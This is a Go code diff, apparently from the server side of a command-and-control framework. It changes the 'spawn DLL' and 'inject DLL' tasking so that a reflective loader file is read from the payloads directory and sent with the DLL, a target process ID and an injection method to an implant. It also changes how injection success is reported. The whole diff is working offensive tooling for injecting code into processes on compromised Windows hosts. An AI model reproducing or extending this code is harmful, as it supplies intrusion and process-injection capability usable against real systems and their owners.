@@ -8,6 +8,7 @@ import (
 	"errors"
 	"fmt"
 	"io"
+	"os"
 	"math/rand"
 	"net"
 	"strconv"
@@ -578,11 +579,21 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string) (
 
 	case COMMAND_SPAWNDLL:
 		var (
-			Binary, _ = base64.StdEncoding.DecodeString(Optional["Binary"].(string))
-			Args, _   = base64.StdEncoding.DecodeString(Optional["Arguments"].(string))
+			Binary, _            = base64.StdEncoding.DecodeString(Optional["Binary"].(string))
+			Args, _              = base64.StdEncoding.DecodeString(Optional["Arguments"].(string))
+			DllReflectiveLdrPath string
+			DllReflectiveLdr     []byte
 		)
 
+		DllReflectiveLdrPath = utils.GetTeamserverPath() + "/payloads/DllLdr.x64.bin"
+
+		DllReflectiveLdr, err := os.ReadFile(DllReflectiveLdrPath)
+		if err != nil {
+			return nil, errors.New("Couldn't read content of file: " + err.Error())
+		}
+
 		job.Data = []interface{}{
+			DllReflectiveLdr,
 			Binary,
 			Args,
 		}
@@ -638,15 +649,25 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string) (
 
 	case COMMAND_INJECT_DLL:
 		var (
-			binaryDecoded, _ = base64.StdEncoding.DecodeString(Optional["Binary"].(string))
-			TargetPID, _     = strconv.Atoi(Optional["PID"].(string))
-			Param, _         = Optional["Arguments"].(string)
-			InjectMethode    int
+			binaryDecoded, _     = base64.StdEncoding.DecodeString(Optional["Binary"].(string))
+			TargetPID, _         = strconv.Atoi(Optional["PID"].(string))
+			Param, _             = Optional["Arguments"].(string)
+			InjectMethode        int
+			DllReflectiveLdr     []byte
+			DllReflectiveLdrPath string
 		)
+
+		DllReflectiveLdrPath = utils.GetTeamserverPath() + "/payloads/DllLdr.x64.bin"
+
+		DllReflectiveLdr, err := os.ReadFile(DllReflectiveLdrPath)
+		if err != nil {
+			return nil, errors.New("Couldn't read content of file: " + err.Error())
+		}
 
 		job.Data = []interface{}{
 			InjectMethode, // Injection technique syscall
 			TargetPID,
+			DllReflectiveLdr,
 			binaryDecoded,
 			Param,
 		}
@@ -2616,7 +2637,7 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, teamserver Te
 			Message = make(map[string]string)
 		)
 
-		if Status == win32.TRUE {
+		if Status == 0 {
 			Message["Type"] = "Good"
 			Message["Message"] = "Successful injected reflective dll"
 		} else {
@@ -2640,7 +2661,7 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, teamserver Te
 			Message = make(map[string]string)
 		)
 
-		if Status == win32.TRUE {
+		if Status == 0 {
 			Message["Type"] = "Good"
 			Message["Message"] = "Successful spawned reflective dll"
 		} else {
